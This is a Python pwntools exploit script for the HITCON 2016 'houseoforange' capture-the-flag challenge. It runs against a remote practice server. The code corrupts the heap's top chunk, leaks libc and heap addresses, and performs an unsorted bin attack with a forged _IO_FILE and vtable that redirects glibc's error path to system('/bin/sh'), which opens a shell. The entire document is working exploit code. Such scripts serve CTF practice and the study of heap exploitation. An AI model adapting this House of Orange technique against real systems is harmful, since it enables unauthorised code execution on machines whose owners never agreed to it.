from pwn import*

# p = process('./houseoforange_hitcon_2016')

#set top_chunk->size=0xf81
while True :
    try :
        p= remote('node3.buuoj.cn',29376)
        elf = ELF('./houseoforange_hitcon_2016')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        def menu(idx):
            p.recvuntil(': ')
            p.sendline(str(idx))

        def see():
            menu(2)

        def build(length, nm, pz, color):
            menu(1)
            p.recvuntil(":")
            p.sendline(str(length))
            p.recvuntil(":")
            p.send(nm)
            p.recvuntil(":")
            p.sendline(str(pz))
            p.recvuntil(":")
            p.sendline(str(color))

        def upgrade(length, nm, pz, color):
            menu(3)
            p.recvuntil(":")
            p.sendline(str(length))
            p.recvuntil(":")
            p.send(nm)
            p.recvuntil(":")
            p.sendline(str(pz))
            p.recvuntil(":")
            p.sendline(str(color))

        build(0x30,'a'*8,123,1)
        payload = 'a'*0x30 + p64(0) + p64(0x21) +'a'*16+ p64(0)+ p64(0xf81)
        upgrade(len(payload),payload,123,2)

        #top_chunk to unsorted bin
        build(0x1000,'b',123,1)
        log.info('-----------------------leak address-------------------------')

        #malloc largechunk to use old_top
        #leak libc_base
        build(0x400,'a'*8,123,1)
        #gdb.attach(p)
        off_to_libc_base=0x3c4b20
        off_to_main_arena=1640
        see()
        p.recvuntil("a"*8)
        leak = u64(p.recv(6).ljust(8,'\x00'))
        libc_base = leak -off_to_main_arena- off_to_libc_base
        print "libc base address -->[%s]"%hex(libc_base)

        #malloc largechunk again
        #leak heap_base
        upgrade(0x400,'a'*16,123,1)
        #gdb.attach(p)
        off_to_heap_base=0xe0
        see()
        p.recvuntil('a'*16)
        leak_heap = u64(p.recv(6).ljust(8,'\x00'))
        heap_base = leak_heap - off_to_heap_base
        print "leak_heap -->[%s]"%hex(leak_heap)
        print "heap_base -->[%s]"%hex(heap_base)

        #unsorted bin attack
        #_IO_list_all -> &unsorted bin-0x10  //fake _IO_FILE in main_arena
        #*(_IO_FILE+0X68)=*(&unsorted bin-0x10+0x68)
        #chain=smallbin[4]
        #old_top_chunk->size=0x61
        #old_top_chunk to smallbin[4]
        #chain -> old_top_chunk
        #make fake _IO_FILE in old_top_chunk
        _IO_list_all = libc.symbols['_IO_list_all'] + libc_base
        system = libc.symbols['system'] + libc_base
        log.info('-------------------------unsorted bin and build fake file--------------------------')
        payload = 'a'*0x400
        payload += p64(0) + p64(0x21) + 'a'*0x10
        #old_top_chunk=_IO_FILE
        fake_file = '/bin/sh\x00' + p64(0x61)
        fake_file += p64(0) + p64(_IO_list_all - 0x10)#unsorted bin attack
        fake_file += p64(0) + p64(1) 
        #bypass check
        #_IO_FILE fp
        #fp->_IO_write_base < fp->_IO_write_ptr (offset *(0x20)<*(0x28))
        #fp->_mode<=0   (offset *(0xc8)<=0)
        fake_file = fake_file.ljust(0xc0,'\x00')
        payload += fake_file
        payload += p64(0)*3
        #0xc0+0x18=0xd8
        #_IO_jump_t *ptr_vtable
        #file_adr+0xd8=&ptr_vtable
        #vtable[3]=overflow_adr
        #gdb.attach(p)
        payload += p64(heap_base + 0x5f0)#ptr_vtable
        payload += p64(0)*3#vtable
        payload += p64(system)#vtable[3]
        upgrade(0x800,payload,123,1)
        p.recv()
        p.sendline('1')
        p.sendline('1')
        #malloc size<=2*SIZE_SZ
        #malloc(0x10) -> malloc_printerr ->overflow(IO_list_all) ->system('/bin/sh')
        p.interactive()
    except Exception as e:
        p.close()
        continue
    else:
        continue